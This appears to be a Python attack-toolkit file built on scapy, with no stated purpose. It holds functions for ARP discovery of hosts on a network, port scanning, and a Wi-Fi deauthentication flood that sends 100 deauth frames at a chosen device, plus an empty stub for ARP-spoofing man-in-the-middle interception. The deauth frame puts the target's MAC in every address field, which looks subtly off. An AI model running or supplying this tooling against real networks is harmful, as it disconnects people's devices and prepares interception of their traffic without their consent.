from scapy.all import ARP, Ether, srp, RadioTap, Dot11, Dot11Deauth, sendp
import socket


def arp_scan(target_ip):
    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=2, verbose=False)[0]

    devices = [{'ip': rcv.psrc, 'mac': rcv.hwsrc} for snd, rcv in result]
    return devices


def port_scan(target_ip, ports=[22, 80, 443, 8080]):
    open_ports = []

    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        try:
            sock.connect((target_ip, port))
            open_ports.append(port)
        except:
            pass
        finally:
            sock.close()

    return open_ports


def wifi_deauth(target_mac, iface="wlan0"):
    pkt = RadioTap()/Dot11(addr1=target_mac, addr2=target_mac, addr3=target_mac)/Dot11Deauth()
    sendp(pkt, iface=iface, count=100, inter=0.1, verbose=False)


def mitm_arp_spoof(target_ip, gateway_ip, iface="eth0"):
    pass